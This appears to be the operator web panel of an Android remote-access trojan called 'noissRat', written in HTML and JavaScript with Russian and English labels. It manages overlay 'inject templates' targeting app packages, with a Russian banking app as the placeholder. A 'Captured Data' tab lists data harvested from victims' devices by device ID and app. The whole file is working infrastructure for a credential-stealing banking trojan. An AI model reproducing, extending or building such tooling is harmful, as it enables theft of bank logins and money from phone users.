<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>noissRat - Inject Templates</title>
    <link href="https://fonts.googleapis.com/css2?family=Exo+2:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
    <script src="https://unpkg.com/feather-icons"></script>
    <script src="/theme.js?v=2"></script>
    <style>
        :root {
            --bg-dark: #080809; --bg-card: #0f0f12; --bg-card-hover: #151518;
            --border-color: #1a1a1f; --red-primary: #dc3545; --red-dark: #a71d2a;
            --red-glow: rgba(220, 53, 69, 0.25);
            --text-white: #e8e8e8; --text-gray: #707078; --text-dim: #404048;
            --text-secondary: #a0a0a8;
            --accent-green: #20c997; --accent-blue: #4dabf7; --accent-purple: #9775fa;
            --accent-yellow: #ffc107; --accent-orange: #fd7e14;
            --scrollbar-thumb: #1a1a1f;
        }
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family:'Exo 2',sans-serif; background:var(--bg-dark); color:var(--text-white); min-height:100vh; }
        ::-webkit-scrollbar { width:6px; } ::-webkit-scrollbar-track { background:var(--bg-dark); }
        ::-webkit-scrollbar-thumb { background:var(--scrollbar-thumb); border-radius:3px; }
        .mono { font-family:'JetBrains Mono',monospace; }

        .header {
            padding:16px 28px; border-bottom:1px solid rgba(255,255,255,0.04);
            display:flex; align-items:center; gap:16px;
            background:rgba(15,15,18,0.8); backdrop-filter:blur(16px);
            position:sticky; top:0; z-index:100;
        }
        .header h1 { font-size:1.15rem; font-weight:600; display:flex; align-items:center; gap:8px; }
        .header .back {
            color:var(--text-dim); text-decoration:none; font-size:0.82rem;
            display:flex; align-items:center; gap:4px; padding:5px 12px;
            border-radius:8px; transition:all 0.2s;
            border:1px solid rgba(255,255,255,0.06); background:rgba(255,255,255,0.02);
        }
        .header .back:hover { color:var(--text-white); border-color:rgba(255,255,255,0.12); background:rgba(255,255,255,0.04); }

        .container { max-width:1200px; margin:0 auto; padding:24px; }

        .toolbar { display:flex; gap:10px; align-items:center; flex-wrap:wrap; margin-bottom:20px; }
        .btn {
            padding:8px 18px; border-radius:8px; border:1px solid rgba(255,255,255,0.06);
            background:rgba(255,255,255,0.03); color:var(--text-white); cursor:pointer;
            font-size:0.8rem; font-family:'Exo 2',sans-serif; transition:all 0.25s ease;
            display:flex; align-items:center; gap:6px;
        }
        .btn:hover { background:rgba(255,255,255,0.06); border-color:rgba(255,255,255,0.12); }
        .btn-primary { border-color:rgba(32,201,151,0.3); color:var(--accent-green); background:rgba(32,201,151,0.06); }
        .btn-primary:hover { background:rgba(32,201,151,0.12); border-color:rgba(32,201,151,0.5); box-shadow:0 2px 10px rgba(32,201,151,0.12); }
        .btn-danger { border-color:rgba(220,53,69,0.3); color:var(--red-primary); background:rgba(220,53,69,0.06); }
        .btn-danger:hover { background:rgba(220,53,69,0.12); border-color:rgba(220,53,69,0.5); }

        .tmpl-grid { display:grid; grid-template-columns:repeat(auto-fill, minmax(320px, 1fr)); gap:16px; }

        .tmpl-card {
            background:rgba(15,15,18,0.7); border:1px solid rgba(255,255,255,0.06);
            border-radius:14px; padding:20px; transition:all 0.3s ease; backdrop-filter:blur(10px);
        }
        .tmpl-card:hover { border-color:rgba(255,255,255,0.12); box-shadow:0 4px 20px rgba(0,0,0,0.3); transform:translateY(-2px); }
        .tmpl-card .pkg { font-family:'JetBrains Mono',monospace; font-size:0.72rem; color:var(--accent-blue); margin-bottom:6px; word-break:break-all; opacity:0.8; }
        .tmpl-card .name { font-size:1rem; font-weight:600; margin-bottom:10px; }
        .tmpl-card .meta { font-size:0.72rem; color:var(--text-gray); display:flex; gap:12px; margin-bottom:14px; align-items:center; }
        .tmpl-card .meta .status {
            padding:2px 10px; border-radius:20px; font-weight:600;
            background:rgba(32,201,151,0.1); color:var(--accent-green);
        }
        .tmpl-card .meta .status.off { background:rgba(220,53,69,0.1); color:var(--red-primary); }
        .tmpl-card .actions { display:flex; gap:8px; }
        .tmpl-card .actions button { font-size:0.72rem; padding:5px 12px; border-radius:6px; }

        /* Modal */
        .modal-bg { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.75); backdrop-filter:blur(4px); z-index:1000; align-items:center; justify-content:center; }
        .modal-bg.open { display:flex; }
        .modal {
            background:rgba(15,15,18,0.95); border:1px solid rgba(255,255,255,0.08);
            border-radius:16px; width:95%; max-width:900px; max-height:90vh;
            overflow-y:auto; padding:28px; backdrop-filter:blur(20px);
            box-shadow:0 20px 60px rgba(0,0,0,0.5);
        }
        .modal h2 { font-size:1.1rem; margin-bottom:18px; font-weight:600; }
        .modal label { display:block; font-size:0.72rem; color:var(--text-gray); margin-bottom:5px; margin-top:14px; text-transform:uppercase; letter-spacing:0.5px; font-weight:500; }
        .modal input, .modal textarea, .modal select {
            width:100%; padding:10px 14px; background:rgba(8,8,9,0.6);
            border:1px solid rgba(255,255,255,0.06); border-radius:8px;
            color:var(--text-white); font-family:'JetBrains Mono',monospace; font-size:0.8rem;
            transition:all 0.25s ease;
        }
        .modal input:focus, .modal textarea:focus, .modal select:focus {
            outline:none; border-color:rgba(220,53,69,0.5); box-shadow:0 0 0 3px rgba(220,53,69,0.1);
        }
        .modal textarea { min-height:200px; resize:vertical; }
        .modal .row { display:flex; gap:14px; }
        .modal .row > * { flex:1; }
        .modal .footer { display:flex; justify-content:flex-end; gap:10px; margin-top:22px; padding-top:18px; border-top:1px solid rgba(255,255,255,0.04); }

        .preview-frame { width:100%; height:400px; border:1px solid rgba(255,255,255,0.06); border-radius:10px; background:#fff; margin-top:8px; }

        .data-table { width:100%; border-collapse:collapse; font-size:0.75rem; }
        .data-table th { text-align:left; padding:10px 12px; border-bottom:1px solid rgba(255,255,255,0.04); color:var(--text-gray); font-weight:600; font-size:0.7rem; text-transform:uppercase; letter-spacing:0.5px; }
        .data-table td { padding:10px 12px; border-bottom:1px solid rgba(255,255,255,0.03); }
        .data-table tr:hover td { background:rgba(255,255,255,0.02); }

        .tabs {
            display:flex; gap:6px; margin-bottom:24px; padding:5px;
            background:rgba(15,15,18,0.6); border:1px solid rgba(255,255,255,0.06);
            border-radius:10px; backdrop-filter:blur(10px);
        }
        .tab {
            padding:9px 20px; cursor:pointer; color:var(--text-dim); font-size:0.84rem;
            border-radius:7px; transition:all 0.25s ease; border:none;
        }
        .tab:hover { color:var(--text-gray); background:rgba(255,255,255,0.03); }
        .tab.active {
            color:white; background:linear-gradient(135deg, var(--red-primary), var(--red-dark));
            box-shadow:0 3px 12px rgba(220,53,69,0.3);
        }
        .tab-panel { display:none; }
        .tab-panel.active { display:block; animation:tabFade 0.3s ease; }
        @keyframes tabFade { from { opacity:0; transform:translateY(6px); } to { opacity:1; transform:translateY(0); } }

        .empty-msg { color:var(--text-dim); text-align:center; padding:50px 20px; font-size:0.85rem; }
        .badge { display:inline-block; padding:2px 8px; border-radius:20px; font-size:0.65rem; font-weight:600; }
        .badge-on { background:rgba(32,201,151,0.12); color:var(--accent-green); }
        .badge-off { background:rgba(220,53,69,0.12); color:var(--red-primary); }

        .notification {
            position:fixed; top:20px; right:20px; padding:12px 20px; border-radius:12px;
            font-size:0.82rem; z-index:2000; animation:slideIn 0.35s cubic-bezier(0.4,0,0.2,1);
            backdrop-filter:blur(16px); box-shadow:0 8px 30px rgba(0,0,0,0.4);
        }
        .notification.success { background:rgba(32,201,151,0.15); border:1px solid rgba(32,201,151,0.3); color:var(--accent-green); }
        .notification.error { background:rgba(220,53,69,0.15); border:1px solid rgba(220,53,69,0.3); color:var(--red-primary); }
        @keyframes slideIn { from { transform:translateX(100%); opacity:0; } to { transform:translateX(0); opacity:1; } }

        @media (max-width: 768px) {
            .container { padding:16px; }
            .header { padding:12px 16px; }
            .header h1 { font-size:1rem; }
            .tmpl-grid { grid-template-columns:1fr; }
            .modal { padding:18px; border-radius:12px; }
            .modal .row { flex-direction:column; gap:0; }
            .tabs { gap:3px; padding:4px; }
            .tab { padding:8px 14px; font-size:0.78rem; }
        }
    </style>
<script src="/guard.js"></script></head>
<body>
    <div class="header">
        <a href="dashboard.html" class="back"><i data-feather="arrow-left" style="width:14px;height:14px;"></i> <span data-i18n="back_panel">Панель</span></a>
        <h1><i data-feather="crosshair" style="width:18px;height:18px;"></i> <span data-i18n="page_title_injects">Inject Templates</span></h1>
        <div style="margin-left:auto;">
            <button id="langToggleBtn" onclick="toggleLang()" style="background:var(--bg-card);border:1px solid var(--border-color);color:var(--text-secondary);padding:4px 10px;border-radius:6px;cursor:pointer;font-size:.8rem;font-weight:600;">RU</button>
        </div>
    </div>

    <div class="container">
        <div class="tabs">
            <div class="tab active" onclick="switchTab('templates')" data-i18n="tab_templates">Шаблоны</div>
            <div class="tab" onclick="switchTab('data')" data-i18n="tab_data">Захваченные данные</div>
        </div>

        <!-- Templates Tab -->
        <div class="tab-panel active" id="tabTemplates">
            <div class="toolbar">
                <a href="/api/inject-constructor/page" class="btn" style="text-decoration:none;border-color:rgba(168,85,247,0.3);color:var(--accent-purple);background:rgba(168,85,247,0.06)"><i data-feather="layers" style="width:14px;height:14px;"></i> <span data-i18n="btn_constructor">Конструктор</span></a>
                <button class="btn" onclick="loadTemplates()"><i data-feather="refresh-cw" style="width:14px;height:14px;"></i> <span data-i18n="btn_refresh">Обновить</span></button>
                <span id="tmplCount" style="font-size:0.7rem;color:var(--text-dim);margin-left:auto;"></span>
            </div>
            <div class="tmpl-grid" id="tmplGrid">
                <div class="empty-msg" data-i18n="loading">Загрузка...</div>
            </div>
        </div>

        <!-- Data Tab -->
        <div class="tab-panel" id="tabData">
            <div class="toolbar">
                <button class="btn" onclick="loadData()"><i data-feather="refresh-cw" style="width:14px;height:14px;"></i> <span data-i18n="btn_refresh_data">Обновить</span></button>
                <button class="btn btn-danger" onclick="clearAllData()"><i data-feather="trash-2" style="width:14px;height:14px;"></i> <span data-i18n="btn_clear_all">Очистить все</span></button>
                <span id="dataCount" style="font-size:0.7rem;color:var(--text-dim);margin-left:auto;"></span>
            </div>
            <div id="dataContainer">
                <div class="empty-msg" data-i18n="click_refresh_to_load">Нажмите "Обновить" для загрузки</div>
            </div>
        </div>
    </div>

    <!-- Editor Modal -->
    <div class="modal-bg" id="editorModal">
        <div class="modal" style="max-width:440px;">
            <h2 id="editorTitle" data-i18n="edit_template">Редактировать шаблон</h2>
            <div style="display:flex;flex-direction:column;gap:12px;">
                <div>
                    <label data-i18n="label_package">Package Name</label>
                    <input type="text" id="edPkg" placeholder="ru.sberbankmobile">
                </div>
                <div>
                    <label data-i18n="label_app_name">App Name</label>
                    <input type="text" id="edName" placeholder="App">
                </div>
                <div>
                    <label data-i18n="label_status">Статус</label>
                    <select id="edActive"><option value="true" data-i18n="status_active">Активен</option><option value="false" data-i18n="status_disabled">Выключен</option></select>
                </div>
            </div>
            <div class="footer" style="margin-top:16px;">
                <button class="btn" onclick="closeEditor()" data-i18n="btn_cancel">Отмена</button>
                <button class="btn btn-primary" onclick="saveTemplate()" data-i18n="btn_save">Сохранить</button>
            </div>
        </div>
    </div>

<script>
    let LANG = localStorage.getItem('rw_panel_lang') || 'ru';
    const I18N = {
        ru: {
            back_panel: 'Панель',
            page_title_injects: 'Inject Templates',
            tab_templates: 'Шаблоны',
            tab_data: 'Захваченные данные',
            btn_constructor: 'Конструктор',
            btn_refresh: 'Обновить',
            btn_refresh_data: 'Обновить',
            loading: 'Загрузка...',
            btn_clear_all: 'Очистить все',
            click_refresh_to_load: 'Нажмите "Обновить" для загрузки',
            edit_template: 'Редактировать шаблон',
            label_package: 'Package Name',
            label_app_name: 'App Name',
            label_status: 'Статус',
            status_active: 'Активен',
            status_disabled: 'Выключен',
            btn_cancel: 'Отмена',
            btn_save: 'Сохранить',
            team_not_found: 'team_id not found. Войдите через панель.',
            n_templates: 'шаблонов',
            no_templates: 'Нет шаблонов. Используйте Конструктор для создания.',
            btn_edit: 'Изменить',
            template_not_found: 'Шаблон не найден',
            edit_prefix: 'Редактировать: ',
            package_required: 'Package обязателен',
            template_saved: 'Шаблон сохранен',
            error_generic: 'Ошибка',
            confirm_delete_template: 'Удалить шаблон',
            template_deleted: 'Шаблон удален',
            n_records: 'записей',
            no_captured_data: 'Нет захваченных данных',
            th_time: 'Время',
            th_device: 'Устройство',
            th_app: 'Приложение',
            th_package: 'Package',
            th_data: 'Данные',
            confirm_clear_all: 'Очистить ВСЕ захваченные данные?',
            data_cleared: 'Данные очищены'
        },
        en: {
            back_panel: 'Panel',
            page_title_injects: 'Inject Templates',
            tab_templates: 'Templates',
            tab_data: 'Captured Data',
            btn_constructor: 'Constructor',
            btn_refresh: 'Refresh',
            btn_refresh_data: 'Refresh',
            loading: 'Loading...',
            btn_clear_all: 'Clear All',
            click_refresh_to_load: 'Click "Refresh" to load',
            edit_template: 'Edit Template',
            label_package: 'Package Name',
            label_app_name: 'App Name',
            label_status: 'Status',
            status_active: 'Active',
            status_disabled: 'Disabled',
            btn_cancel: 'Cancel',
            btn_save: 'Save',
            team_not_found: 'team_id not found. Log in via panel.',
            n_templates: 'templates',
            no_templates: 'No templates. Use the Constructor to create.',
            btn_edit: 'Edit',
            template_not_found: 'Template not found',
            edit_prefix: 'Edit: ',
            package_required: 'Package is required',
            template_saved: 'Template saved',
            error_generic: 'Error',
            confirm_delete_template: 'Delete template',
            template_deleted: 'Template deleted',
            n_records: 'records',
            no_captured_data: 'No captured data',
            th_time: 'Time',
            th_device: 'Device',
            th_app: 'Application',
            th_package: 'Package',
            th_data: 'Data',
            confirm_clear_all: 'Clear ALL captured data?',
            data_cleared: 'Data cleared'
        }
    };
    function L(k) { return (I18N[LANG] || I18N.ru)[k] || k; }
    function applyI18n() {
        document.querySelectorAll('[data-i18n]').forEach(el => {
            const k = el.getAttribute('data-i18n');
            const v = L(k);
            if (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA') el.placeholder = v;
            else el.innerHTML = v;
        });
        document.querySelectorAll('[data-i18n-title]').forEach(el => {
            el.title = L(el.getAttribute('data-i18n-title'));
        });
    }
    function toggleLang() {
        LANG = LANG === 'ru' ? 'en' : 'ru';
        localStorage.setItem('rw_panel_lang', LANG);
        applyI18n();
        document.getElementById('langToggleBtn').textContent = LANG.toUpperCase();
        renderTemplates();
    }

    const teamId = localStorage.getItem('panel_team_id') || new URLSearchParams(window.location.search).get('team') || '';
    if (!teamId) {
        fetch('/api/validate_session', { method: 'POST', headers: {'Content-Type':'application/json'}, body: '{}' })
            .then(r => r.json())
            .then(d => {
                if (!d.valid) { window.location.href = '/login.html'; return; }
                localStorage.setItem('panel_team_id', d.team_id);
                localStorage.setItem('panel_role', d.role || 'ts');
                localStorage.setItem('panel_login', d.login || '');
                localStorage.setItem('panel_display_name', d.display_name || d.login || '');
                window.location.reload();
            });
    }

    function esc(s) { return (s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }

    function notify(msg, type='success') {
        const n = document.createElement('div');
        n.className = 'notification ' + type;
        n.textContent = msg;
        document.body.appendChild(n);
        setTimeout(() => n.remove(), 3000);
    }

    async function api(method, path, body) {
        const opts = { method, credentials: 'include', headers: {'Content-Type': 'application/json'} };
        if (body) opts.body = JSON.stringify(body);
        const r = await fetch(path, opts);
        return await r.json();
    }

    function switchTab(name) {
        document.querySelectorAll('.tab').forEach((t,i) => {
            t.classList.toggle('active', (name === 'templates' && i === 0) || (name === 'data' && i === 1));
        });
        document.getElementById('tabTemplates').classList.toggle('active', name === 'templates');
        document.getElementById('tabData').classList.toggle('active', name === 'data');
        if (name === 'data') loadData();
    }

    // ========== TEMPLATES ==========
    let templates = [];

    async function loadTemplates() {
        if (!loadTemplates._defaultsEnsured) {
            loadTemplates._defaultsEnsured = true;
            try { await api('POST', '/api/inject-constructor/ensure-defaults', {}); } catch(e) {}
        }
        const d = await api('GET', `/api/panel/injects/templates/${teamId}`);
        templates = d.templates || [];
        renderTemplates();
    }

    function renderTemplates() {
        const grid = document.getElementById('tmplGrid');
        document.getElementById('tmplCount').textContent = templates.length + ' ' + L('n_templates');
        if (!templates.length) { grid.innerHTML = '<div class="empty-msg">' + esc(L('no_templates')) + '</div>'; return; }
        grid.innerHTML = templates.map(t => `
            <div class="tmpl-card">
                <div class="pkg">${esc(t.target_package)}</div>
                <div class="name">${esc(t.app_name || t.target_package)}</div>
                <div class="meta">
                    <span class="status ${t.active?'':'off'}">${t.active ? L('status_active') : L('status_disabled')}</span>
                    <span>${t.created_at ? new Date(t.created_at).toLocaleDateString(LANG === 'ru' ? 'ru-RU' : 'en-US') : ''}</span>
                </div>
                <div class="actions">
                    <button class="btn" onclick="editTemplate(${t.id})"><i data-feather="edit-2" style="width:12px;height:12px;"></i> ${L('btn_edit')}</button>
                    <button class="btn btn-danger" onclick="deleteTemplate(${t.id}, '${esc(t.target_package)}')"><i data-feather="trash-2" style="width:12px;height:12px;"></i></button>
                </div>
            </div>
        `).join('');
        if (typeof feather !== 'undefined') feather.replace();
    }

    let editingId = null;

    let _editingHtml = '';

    async function editTemplate(id) {
        const d = await api('GET', `/api/panel/injects/template/${teamId}/${id}`);
        if (!d.template) { notify(L('template_not_found'), 'error'); return; }
        const t = d.template;
        editingId = id;
        _editingHtml = t.html_content || '';
        document.getElementById('editorTitle').textContent = L('edit_prefix') + (t.app_name || t.target_package);
        document.getElementById('edPkg').value = t.target_package || '';
        document.getElementById('edName').value = t.app_name || '';
        document.getElementById('edActive').value = t.active ? 'true' : 'false';
        document.getElementById('editorModal').classList.add('open');
    }

    function closeEditor() { document.getElementById('editorModal').classList.remove('open'); }

    async function saveTemplate() {
        const pkg = document.getElementById('edPkg').value.trim();
        const name = document.getElementById('edName').value.trim();
        const active = document.getElementById('edActive').value === 'true';
        if (!pkg) { notify(L('package_required'), 'error'); return; }
        const d = await api('POST', `/api/panel/injects/templates/${teamId}`, { target_package: pkg, app_name: name, html_content: _editingHtml, active });
        if (d.success) { notify(L('template_saved')); closeEditor(); loadTemplates(); }
        else notify(d.error || L('error_generic'), 'error');
    }

    async function deleteTemplate(id, pkg) {
        if (!confirm(`${L('confirm_delete_template')} ${pkg}?`)) return;
        const d = await api('DELETE', `/api/panel/injects/template/${teamId}/${id}`);
        if (d.success) { notify(L('template_deleted')); loadTemplates(); }
        else notify(d.error || L('error_generic'), 'error');
    }

    // ========== DATA ==========
    async function loadData() {
        const d = await api('GET', `/api/panel/injects/data/${teamId}?limit=500`);
        const data = d.data || [];
        document.getElementById('dataCount').textContent = data.length + ' ' + L('n_records');
        if (!data.length) { document.getElementById('dataContainer').innerHTML = '<div class="empty-msg">' + esc(L('no_captured_data')) + '</div>'; return; }
        let html = `<table class="data-table"><thead><tr><th>${L('th_time')}</th><th>${L('th_device')}</th><th>${L('th_app')}</th><th>${L('th_package')}</th><th>${L('th_data')}</th></tr></thead><tbody>`;
        data.forEach(r => {
            const time = r.created_at ? new Date(r.created_at).toLocaleString(LANG === 'ru' ? 'ru-RU' : 'en-US') : '';
            const cd = r.captured_data || {};
            const dataStr = Object.entries(cd).map(([k,v]) => `<b>${esc(k)}</b>: ${esc(String(v))}`).join(', ');
            html += `<tr><td>${time}</td><td class="mono" style="font-size:0.65rem;">${esc(r.device_id||'')}</td><td>${esc(r.app_name)}</td><td class="mono" style="font-size:0.65rem;">${esc(r.target_package)}</td><td>${dataStr}</td></tr>`;
        });
        html += '</tbody></table>';
        document.getElementById('dataContainer').innerHTML = html;
    }

    async function clearAllData() {
        if (!confirm(L('confirm_clear_all'))) return;
        await api('DELETE', `/api/panel/injects/data/${teamId}/all`);
        notify(L('data_cleared'));
        loadData();
    }

    // Init
    document.getElementById('langToggleBtn').textContent = LANG.toUpperCase();
    applyI18n();
    loadTemplates();
    if (typeof feather !== 'undefined') feather.replace();
</script>
</body>
</html>
